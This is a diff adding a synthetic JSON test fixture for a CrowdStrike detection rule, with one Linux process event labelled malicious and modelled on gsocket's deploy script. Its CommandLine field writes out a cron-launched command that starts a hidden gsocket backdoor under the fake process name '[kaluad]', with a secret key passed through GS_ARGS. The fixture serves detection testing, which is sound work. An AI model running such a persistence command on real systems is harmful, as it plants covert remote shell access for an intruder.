@@ -1,0 +1,23 @@
+{
+  "label": "malicious",
+  "variant": "Cron line passes the secret file through GS_ARGS (deploy.sh CRONTAB_LINE shape)",
+  "synthetic": true,
+  "source": "synthetic; https://github.com/hackerschoice/gsocket/blob/master/deploy/deploy.sh",
+  "platform": "crowdstrike",
+  "table": "ProcessRollup2",
+  "expect_alert": true,
+  "result": "not run (no LogScale or Advanced Hunting runner). Regex-level Python check of the rule's patterns: would alert, matches expectation",
+  "events": [
+    {
+      "#event_simpleName": "ProcessRollup2",
+      "event_platform": "Lin",
+      "@timestamp": "2026-11-10T13:10:00Z",
+      "aid": "0000000000000000000000000000syn1",
+      "UID": "33",
+      "GrandParentBaseFileName": "systemd",
+      "ParentBaseFileName": "cron",
+      "ImageFileName": "/bin/sh",
+      "CommandLine": "/bin/sh -c pkill -0 -U33 defunct 2>/dev/null || SHELL=/bin/bash TERM=xterm-256color GS_ARGS=\"-k /var/www/.config/dbus/defunct.dat -liqD\" /usr/bin/bash -c \"exec -a '[kaluad]' '/var/www/.config/dbus/defunct'\" 2>/dev/null"
+    }
+  ]
+}
